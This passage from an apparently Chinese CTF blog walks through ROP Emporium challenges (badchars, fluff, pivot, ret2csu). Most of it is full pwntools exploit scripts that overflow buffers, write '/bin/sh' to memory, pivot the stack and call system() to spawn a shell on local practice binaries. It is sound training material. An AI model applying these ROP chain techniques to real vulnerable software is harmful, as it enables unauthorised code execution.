<h5 id="64位-4"><a href="#64位-4" class="headerlink" title="64位:"></a><a href="https://ropemporium.com/binary/badchars.zip" target="_blank" rel="noopener">64位</a>:</h5><p>和32位一样思路, 只是找到<code>gadget</code>不一样, 还要注意要比32位程序多用一个<code>pop rdi; ret</code>.</p>
<p>exp:</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./badchars"</span><span class="token punctuation">)</span>

xor_num <span class="token operator">=</span> <span class="token number">2</span>

binsh <span class="token operator">=</span> <span class="token string">'/bin/sh\x00'</span>
xorbinsh <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> binsh<span class="token punctuation">:</span>
    a <span class="token operator">=</span> ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">^</span> xor_num
    xorbinsh <span class="token operator">+=</span> chr<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
overflow <span class="token operator">=</span> cyclic_find<span class="token punctuation">(</span><span class="token string">"kaaa"</span><span class="token punctuation">)</span>
pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000400b39</span>
pop_r12_r13_ret <span class="token operator">=</span> <span class="token number">0x0000000000400b3b</span>
mov_r13_r12_ret <span class="token operator">=</span> <span class="token number">0x0000000000400b34</span>
pop_r14_r15_ret <span class="token operator">=</span> <span class="token number">0x0000000000400b40</span>
xor_r15_r14_ret <span class="token operator">=</span> <span class="token number">0x0000000000400b30</span>
bss_addr <span class="token operator">=</span> <span class="token number">0x601080</span>
system_addr <span class="token operator">=</span> <span class="token number">0x4006f0</span>

payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> overflow
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_r12_r13_ret<span class="token punctuation">)</span> <span class="token operator">+</span> xorbinsh <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>mov_r13_r12_ret<span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>xorbinsh<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_r14_r15_ret<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>xor_num<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bss_addr <span class="token operator">+</span> i<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>xor_r15_r14_ret<span class="token punctuation">)</span>

payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p><img src="/images/14/badchars/2.jpg" alt></p>
<h2 id="fluff"><a href="#fluff" class="headerlink" title="fluff"></a>fluff</h2><h5 id="32位-5"><a href="#32位-5" class="headerlink" title="32位:"></a><a href="https://ropemporium.com/binary/fluff32.zip" target="_blank" rel="noopener">32位</a>:</h5><p>看介绍, 就是<code>write4</code>的升级版, 肯定是要找一条可以把寄存器的值写入到内存地址上的指令, </p>
<pre><code>0x08048693 : mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret</code></pre><p>但是没找到<code>pop ecx; pop edx; ret</code>之类的操作</p>
<p>可是…可以发现一条</p>
<pre><code>0x080485f3 : popal ; cld ; ret</code></pre><p>第一次遇到这个指令, 去搜了一下, 可以从栈上弹到所有寄存器,<br>顺序是<code>%edi-&gt;%esi-&gt;%ebp-&gt;%esp-&gt;%ebx-&gt;%edx-&gt;%ecx-&gt;%eax</code><br>也就是相当于</p>
<pre><code>pop edi;
pop esi;
pop ebp;
pop esp;
pop ebx;
pop edx;
pop ecx;
pop eax;</code></pre><p>这样我们只需要随便填充其他的寄存器, 然后把<code>ecx, edx</code>寄存器填写成我们需要的内容就可以了.</p>
<p>为了减少代码量, 我们还可以写个函数.</p>
<p>直接上exp</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./fluff32"</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># var</span>
offset <span class="token operator">=</span> <span class="token number">44</span>
bss_addr <span class="token operator">=</span> <span class="token number">0x0804a040</span>
bin_sh <span class="token operator">=</span> <span class="token string">"/bin/sh"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">"\0"</span><span class="token punctuation">)</span>
system_addr <span class="token operator">=</span> <span class="token number">0x0804865A</span>

popal <span class="token operator">=</span> <span class="token number">0x080485f3</span> <span class="token comment" spellcheck="true"># %edi->%esi->%ebp->%esp->%ebx->%edx->%ecx->%eax</span>
mov_ecx_edx <span class="token operator">=</span> <span class="token number">0x08048693</span> <span class="token comment" spellcheck="true"># 2  mov [ecx], edx</span>

<span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> offset<span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>popal<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> text  <span class="token comment" spellcheck="true"># edx</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>bss_addr <span class="token operator">+</span> offset<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># ecx</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>mov_ecx_edx<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> payload

payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> offset
payload <span class="token operator">+=</span> write<span class="token punctuation">(</span>bin_sh<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> write<span class="token punctuation">(</span>bin_sh<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p><img src="/images/14/fluff/1.jpg" alt></p>
<h5 id="64位-5"><a href="#64位-5" class="headerlink" title="64位:"></a><a href="https://ropemporium.com/binary/fluff.zip" target="_blank" rel="noopener">64位</a>:</h5><p>只要搞明白, 0 与 正数进行异或, 得到的结果就是那个正数, 可以通过这个方法间接给一个寄存器赋值.</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./fluff"</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># var</span>
offset <span class="token operator">=</span> <span class="token number">0x28</span>
system_addr <span class="token operator">=</span> <span class="token number">0x4005E0</span>
bss_addr <span class="token operator">=</span> <span class="token number">0x0000000000601060</span>
pop_rdi <span class="token operator">=</span> <span class="token number">0x00000000004008c3</span>  <span class="token comment" spellcheck="true"># pop rdi; ret</span>
xor_r11_r11 <span class="token operator">=</span> <span class="token number">0x0000000000400822</span>  <span class="token comment" spellcheck="true"># xor r11, r11; pop; ? ret</span>
pop_r12 <span class="token operator">=</span> <span class="token number">0x0000000000400832</span> <span class="token comment" spellcheck="true"># pop r12 ; ?; ret</span>
xor_r11_r12 <span class="token operator">=</span> <span class="token number">0x000000000040082F</span> <span class="token comment" spellcheck="true"># xor r11, r12; pop; ?; ret</span>
mov_r10_r11 <span class="token operator">=</span> <span class="token number">0x000000000040084E</span>   <span class="token comment" spellcheck="true"># mov [r10], r11; pop r13; pop r12; xor [r10], r12b; ret</span>
xchg_r10_r11 <span class="token operator">=</span> <span class="token number">0x0000000000400840</span>  <span class="token comment" spellcheck="true"># xchg; pop; ?; ret</span>
bin_sh <span class="token operator">=</span> <span class="token string">"/bin/sh"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">"\0"</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># A == 0   ->   A ^= ?   ->  A = ?</span>
<span class="token triple-quoted-string string">"""
>>> r11 = 100
>>> r11 ^= r11
>>> r11
0
>>> r12 = 200
>>> r11 ^= r12
>>> r11
200
"""</span>

payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> offset

<span class="token comment" spellcheck="true"># bin/sh  ->  bss</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>xor_r11_r11<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># r11 = 0</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_r12<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># r12 = bss_addr</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>xor_r11_r12<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># r11 = r12 = bss_addr</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>xchg_r10_r11<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true"># r10 = 0   ->   r10 = r11 = r12 = bss_addr</span>

payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>xor_r11_r11<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># r11 = 0</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_r12<span class="token punctuation">)</span> <span class="token operator">+</span> bin_sh           <span class="token comment" spellcheck="true"># r12 = /bin/sh </span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>xor_r11_r12<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># r11 = 0   ->   r11 = r12 = /bin/sh</span>

payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>mov_r10_r11<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># mov [bss], /bin/sh</span>

payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># bss_addr = /bin/sh</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>                <span class="token comment" spellcheck="true"># system(bss_addr) = system(/bin/sh)</span>


p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p><img src="/images/14/fluff/2.jpg" alt></p>
<h2 id="pivot"><a href="#pivot" class="headerlink" title="pivot"></a>pivot</h2><h6 id="32位-6"><a href="#32位-6" class="headerlink" title="32位:"></a><a href="https://ropemporium.com/binary/pivot32.zip" target="_blank" rel="noopener">32位</a>:</h6><p>分析一下题目, 有两个输入的地方,<br>第一次输入会输入到<code>堆</code>中, 也就是程序打印那个地址.<br>第二次输入就是要溢出了, 但是给我们构造ROP链的大小只有<code>0xb</code>. 肯定不够我们构造复杂的ROP链的, 所以我们要进行<code>栈迁移</code>.</p>
<p>题目给了<code>libcpivot32.so</code>, 分析了一下可以看到<code>ret2win</code>函数和<code>foothold_function</code>, 可以通过泄露<code>foothold_function</code>的地址计算出<code>ret2win</code>的实际地址并执行.</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> time

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pivot32"</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pivot32"</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"libpivot32.so"</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># var</span>
overflow <span class="token operator">=</span> <span class="token number">0x28</span> <span class="token operator">+</span> <span class="token number">4</span>                                <span class="token comment" spellcheck="true"># 溢出字节</span>
ret2win_sym <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"ret2win"</span><span class="token punctuation">]</span>                  <span class="token comment" spellcheck="true"># 得到ret2win函数的地址</span>
foothold_sym <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"foothold_function"</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true"># 得到foothold_function</span>
offset <span class="token operator">=</span> ret2win_sym <span class="token operator">-</span> foothold_sym                <span class="token comment" spellcheck="true"># 计算出foothold到ret2win函数的偏移</span>
foothold_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"foothold_function"</span><span class="token punctuation">]</span>
foothold_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"foothold_function"</span><span class="token punctuation">]</span>

pop_eax <span class="token operator">=</span> <span class="token number">0x080488c0</span>            <span class="token comment" spellcheck="true"># pop eax; ret</span>
pop_ebx <span class="token operator">=</span> <span class="token number">0x08048571</span>            <span class="token comment" spellcheck="true"># pop ebx; ret</span>
mov_eax_eax <span class="token operator">=</span> <span class="token number">0x080488c4</span>        <span class="token comment" spellcheck="true"># mov eax, [eax]; ret</span>
add_eax_ebx <span class="token operator">=</span> <span class="token number">0x080488c7</span>        <span class="token comment" spellcheck="true"># add eax, ebx; ret</span>
call_eax <span class="token operator">=</span> <span class="token number">0x080486a3</span>            <span class="token comment" spellcheck="true"># call eax</span>
xchg_eax_esp <span class="token operator">=</span> <span class="token number">0x080488c2</span>        <span class="token comment" spellcheck="true"># xchg eax, esp; ret</span>

p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"The Old Gods kindly bestow upon you a place to pivot: "</span><span class="token punctuation">)</span>

heap <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 获得程序打印出来的heap地址 也就是我们第一次写入的内容地址.</span>
payload <span class="token operator">=</span> b<span class="token string">""</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>foothold_plt<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_eax<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>foothold_got<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>mov_eax_eax<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_ebx<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>add_eax_ebx<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>call_eax<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

payload <span class="token operator">=</span> b<span class="token string">"A"</span> <span class="token operator">*</span> overflow
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_eax<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>heap<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>xchg_eax_esp<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 让eax和esp两个寄存器交换内容</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p><img src="/images/14/pivot/1.jpg" alt></p>
<p>真实题目:<br><a href="https://buuoj.cn/challenges#[Black%20Watch%20%E5%85%A5%E7%BE%A4%E9%A2%98]PWN" target="_blank" rel="noopener">Black Watch 入群题 PWN</a></p>
<h5 id="64位-6"><a href="#64位-6" class="headerlink" title="64位:"></a><a href>64位</a>:</h5><p>和32位差不多</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding:utf-8</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pivot"</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libpivot.so"</span><span class="token punctuation">)</span>
p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pivot"</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># var</span>
foothold_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'foothold_function'</span><span class="token punctuation">]</span>
foothold_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'foothold_function'</span><span class="token punctuation">]</span>
foothold_sym <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'foothold_function'</span><span class="token punctuation">]</span>
ret2win <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'ret2win'</span><span class="token punctuation">]</span>
offset <span class="token operator">=</span> ret2win <span class="token operator">-</span> foothold_sym
mov_rax_rax <span class="token operator">=</span> <span class="token number">0x0000000000400b05</span>
pop_rax_ret <span class="token operator">=</span> <span class="token number">0x0000000000400b00</span>
call_rax <span class="token operator">=</span><span class="token number">0x00000000040098e</span>
add_rax_rbp <span class="token operator">=</span> <span class="token number">0x00000000000400b09</span>
pop_rbp <span class="token operator">=</span> <span class="token number">0x0000000000400900</span>
xchg_rax_rsp <span class="token operator">=</span> <span class="token number">0x0000000000400b02</span>

p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"The Old Gods kindly bestow upon you a place to pivot: "</span><span class="token punctuation">)</span>

heap <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>

payload1 <span class="token operator">=</span> p64<span class="token punctuation">(</span>foothold_plt<span class="token punctuation">)</span>
payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span>
payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>foothold_got<span class="token punctuation">)</span>
payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>mov_rax_rax<span class="token punctuation">)</span>
payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rbp<span class="token punctuation">)</span>
payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>
payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>add_rax_rbp<span class="token punctuation">)</span>
payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>call_rax<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>
payload2 <span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token number">0x08</span><span class="token punctuation">)</span>
payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span>
payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>heap<span class="token punctuation">)</span>
payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>xchg_rax_rsp<span class="token punctuation">)</span>     
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"into libpivot.so"</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><h5 id="64位-7"><a href="#64位-7" class="headerlink" title="64位:"></a><a href="https://ropemporium.com/binary/ret2csu.zip" target="_blank" rel="noopener">64位</a>:</h5><p><img src="/images/14/ret2csu/1.jpg" alt><br>程序要求我们call<code>ret2win</code>这个函数, 同时<code>rdx</code>寄存器要放入<code>0xdeadcafebabebeef</code>.</p>
<p>通过<code>ROPgadget</code>并没有找到<code>pop rdx; ret</code>之类的, 但是从<code>IDA</code>进行分析, 可以看到<code>__libc_csu_init</code>函数中, 有<code>pop r15</code>和<code>mov rdx, r15</code>之类的, 可以间接进行赋值.<br><img src="/images/14/ret2csu/2.jpg" alt></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>


p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ret2csu"</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># var</span>
init_addr <span class="token operator">=</span> <span class="token number">0x0600E10</span>
mov_rdx_r15 <span class="token operator">=</span> <span class="token number">0x0000000000400880</span>
pop_rbx <span class="token operator">=</span> <span class="token number">0x000000000040089A</span>

ret2win <span class="token operator">=</span> <span class="token number">0x00000000004007B1</span>

p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> b<span class="token string">"A"</span> <span class="token operator">*</span> <span class="token number">0x28</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rbx<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                     <span class="token comment" spellcheck="true"># pop rbx</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>                     <span class="token comment" spellcheck="true"># pop rbp   填写1因为0x400880那串里面有一个add rbx, 1;  再往后有一个cmp, 如果不填写1就又跳回来了.</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>init_addr<span class="token punctuation">)</span>             <span class="token comment" spellcheck="true"># pop r12  如果不init, setvbuf会将edx填写为0xffffffff</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                     <span class="token comment" spellcheck="true"># pop r13</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                     <span class="token comment" spellcheck="true"># pop r14</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadcafebabebeef</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># pop r15</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>mov_rdx_r15<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># ret</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>         <span class="token comment" spellcheck="true"># rbx</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>         <span class="token comment" spellcheck="true"># rbp</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>         <span class="token comment" spellcheck="true"># r12</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>         <span class="token comment" spellcheck="true"># r13</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>         <span class="token comment" spellcheck="true"># r14</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>         <span class="token comment" spellcheck="true"># r15</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret2win<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># ret</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>如果不理解可以通过IDA+Pwntools远程调试, 看清楚栈中数据, 就会理解了。</p>
<p><img src="/images/14/ret2csu/3.jpg" alt></p>

    </div>

    
</div>
    <div class="footer" id="footer">
    <p><h4>Copyright © 2020 | Author: Hel1antHu5 | Theme By <a class="theme-author" href="https://github.com/Xunzhuo/hexo-theme-coder" style="font-size:14px; color: #969696">Coder</a></h4>
    
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
        <span id="busuanzi_container_site_pv">Page Views: <span id="busuanzi_value_site_pv"></span></span>
        <span class="post-meta-divider">|</span>
        <span id="busuanzi_container_site_uv">Unique Visitors: <span id="busuanzi_value_site_uv"></span></span>
    
    <label class="el-switch el-switch-blue el-switch-sm" style="vertical-align: sub;">
        <input type="checkbox" name="switch" id="update_style">
        <span class="el-switch-style"></span>
    </label>

    <!--         <script type="text/javascript">
    var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
    document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
    </script> -->
</p>
</div>

<input type="hidden" id="web_style" value="black">
<input type="hidden" id="valine_appid" value="NOsswOncKgc8HOxqo9oxIWlX-gzGzoHsz">
<input type="hidden" id="valine_appKey" value="z1FihjWEbS8uIfUQdmCtK7zz">
<script src="/libs/jquery.min.js"></script>
<script src="/libs/highlight/highlight.pack.js"></script>
<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
<script src="/js/js.js"></script>
<style type="text/css">
.v * {
color: #698fca;
}
.v .vlist .vcard .vhead .vsys {
color: #3a3e4a;
}
.v .vlist .vcard .vh .vmeta .vat {
color: #638fd5;
}
.v .vlist .vcard .vhead .vnick {
color: #6ba1ff;
}
.v a {
color: #8696b1;
}
.v .vlist .vcard .vhead .vnick:hover {
color: #669bfc;
}
</style>
    <script type="text/javascript" color="173,174,173" opacity='1' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
